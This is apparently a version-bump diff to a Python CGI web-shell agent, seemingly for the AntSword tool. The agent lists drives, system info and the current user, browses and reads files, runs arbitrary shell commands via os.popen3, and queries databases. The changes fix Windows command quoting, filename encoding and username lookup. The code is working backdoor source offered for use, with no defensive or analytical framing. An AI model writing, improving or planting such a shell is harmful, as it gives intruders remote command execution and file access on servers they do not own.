@@ -10,11 +10,13 @@ import base64
 import binascii
 import shutil
 import urllib
-
+import platform
+import cgitb
 import sys
+cgitb.enable()
 reload(sys) 
 sys.setdefaultencoding('utf-8')
-VERSION = "0.0.1"
+VERSION = "0.0.2"
 u'''
               _   ____                       _
    __ _ _ __ | |_/ ___|_      _____  _ __ __| |
@@ -41,6 +43,11 @@ u'''
   3. 赋予可执行权限 chmod +x xxx.py
 
  CHANGELOG:
+
+  Date 2018/12/30 v0.0.2
+    1. 修复 windows 下命令执行参数问题
+    2. 解决 windows 下文件名中文编码问题 (win10以下系统建议使用 gb2312 gbk 编码)
+    3. 修复 windows 下获取当前用户获取不到时致命错误
 
   Date 2018/12/29 v0.0.1
     1. 文件系统 和 terminal 管理
@@ -90,8 +97,17 @@ def BaseInfo():
             if(os.path.isdir("%s:" % chr(L))):
                 ret += "%s:" % chr(L)
     ret += "\t"
-    ret += "%s\t" % ' '.join(os.uname())
-    ret += getpass.getuser()
+    ret += "%s\t" % ' '.join(platform.uname())
+    if platform.system().lower() == 'windows':
+        u = "Unknow" # windows 下没 pwd 使用 getpass.getuser 会出错
+        for name in ('LOGNAME','USER','LNAME','USERNAME'):
+            user = os.environ.get(name)
+            if user:
+                u = user
+                break
+        ret += u
+    else:
+        ret += getpass.getuser()
     return ret
 
 
@@ -105,7 +121,7 @@ def FileTreeCode(d):
     # 如果文件名/目录是中文,则需要 encode 成系统的编码后再去处理
     if(os.path.exists(d.encode(ENCODE))):
         for fname in os.listdir(d.encode(ENCODE)):
-            fname = fname.decode()
+            fname = fname.decode(ENCODE)
             p = os.path.join(d, fname)
             try:
                 fst = os.stat(p.encode(ENCODE))
@@ -117,7 +133,7 @@ def FileTreeCode(d):
                 ret += u"{}\t{}\t{}\t{}\n".format(fname, TimeStampToTime(0), 0, 0)
     else:
         ret = "ERROR:// Path Not Found or No Permission!"
-    return ret
+    return ret.encode(ENCODE)
 
 def ReadFileCode(fpath):
     u'''获取指定路径文件内容
@@ -230,13 +246,13 @@ def ExecuteCommandCode(cmdPath, command):
     if d[0] == "/":
         cmd = [cmdPath, '-c', '%s' % command]
     else:
-        cmd = [cmdPath, '/c', '%s' % command]
+        cmd = '''%s /c "%s"''' % (cmdPath, command)
     c_stdin, c_stdout, c_stderr = os.popen3(cmd)
     c_stdin.close()
     result = c_stdout.read()
     c_stdout.close()
     errmsg = c_stderr.read()
-    errmsg.close()
+    c_stderr.close()
     return result + errmsg
 
 def showDatabases(encode, conf):
@@ -343,7 +359,7 @@ if __name__ == "__main__":
         else:
             pass
     except Exception, e:
-        ret = "ERROR:// %s" % e.strerror
+        ret = "ERROR:// %s" % getattr(e, 'strerror', str(e))
 
     print(ret, end="")
     print(OUT_SUFFIX.decode(ENCODE))
